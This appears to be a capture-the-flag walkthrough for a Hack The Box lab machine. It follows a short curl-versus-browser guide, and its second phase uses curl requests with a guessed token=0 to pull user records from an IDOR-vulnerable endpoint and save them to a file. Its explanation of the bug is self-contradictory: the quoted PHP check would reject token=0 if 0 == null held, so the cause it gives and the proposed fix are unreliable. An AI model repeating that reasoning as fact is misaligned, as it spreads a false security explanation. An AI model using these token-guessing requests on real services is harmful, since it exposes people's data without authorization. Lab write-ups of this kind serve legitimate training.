/ TOOL USAGE GUIDE

curl vs Browser: When to Use What

🖥️ curl (Terminal)

  • Fast testing - No GUI needed
  • Raw output - See exact JSON/HTML
  • Headers inspection - curl -I
  • API testing - POST, PUT, DELETE
  • Automation - Scriptable
  • No caching - Fresh each time
  • SSH-friendly - Works remotely
# Quick check
curl -I http://site.com

# API test
curl "http://site.com/api?token=0"

# POST data
curl -X POST -d "user=admin" http://site.com/login

🌐 Browser (Firefox/Chrome)

  • Visual rendering - See pages as designed
  • Form interaction - Click buttons, fill forms
  • Developer Tools (F12):
    • Network tab - Watch XHR requests
    • Console - JavaScript errors
    • Elements - Inspect HTML
    • Storage - View cookies
  • Session management - Automatic cookies
  • JavaScript execution - See dynamic content

firefox http://monitorsfour.htb

# DevTools shortcut
F12 → Network tab → Reload

/ PHASE 2 / IDOR VULNERABILITY

Token Bypass & User Data Extraction

2.1 Understanding IDOR

IDOR (Insecure Direct Object Reference) occurs when an application exposes direct references to internal objects without proper authorization checks. Here, the token parameter is vulnerable to PHP type juggling.

2.2 Test Token Values

# Try different token values
curl "http://monitorsfour.htb/user?token=1"
curl "http://monitorsfour.htb/user?token=admin"
curl "http://monitorsfour.htb/user?token=0"   # ← THIS WORKS!

2.3 The Magic Response

# Save the output
curl "http://monitorsfour.htb/user?token=0" | jq . > users.json

# View formatted output

2.4 Why Does token=0 Work?

This is a PHP type juggling vulnerability - confirmed by WhatWeb's PHP/8.3.27 detection:

// Vulnerable code (loose comparison)
if ($token == null) {
    return error("Missing token");
}

// In PHP, 0 == null is TRUE because 0 is falsy
// This bypasses the authentication check entirely!
🔒 The Fix

Always use strict comparison (===) in PHP:

if ($token === null) {
    return error("Missing token");
}
